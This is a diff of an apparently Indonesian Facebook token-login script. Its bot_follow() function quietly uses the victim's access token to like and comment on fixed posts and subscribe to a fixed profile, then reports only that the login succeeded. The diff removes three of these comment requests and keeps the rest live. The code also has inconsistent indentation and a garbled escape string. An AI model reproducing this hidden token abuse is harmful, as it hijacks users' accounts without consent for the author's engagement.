@@ -63,7 +63,7 @@ def login():
                         save.close()
                         bot_follow()
                 except KeyError:
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah")
+                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Expired")
 	elif login == "2":
 		print("\x1b[1;96m[\x1b╚══◍➤[1;97m•\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
 		time.sleep(2)
@@ -101,9 +101,6 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
 	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
 	requests.post('https://graph.facebook.com/3889223774448718/comments/?message='+komen2+'&access_token='+token)
-        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' +toket)
-        requests.post('https://graph.facebook.com/953529338576547/comments/?message=Mantap Bang ❤️&access_token=' +toket)
-        requests.post('https://graph.facebook.com/3882176535153442/comments/?message=Mantap Bang ❤️&access_token=' +toket)
 	requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' +toket)
 	print("\x1b[1;96m[\x1b[1;92m#\x1b[1;96m]\x1b[1;92m Login Berhasil")
 	menu()
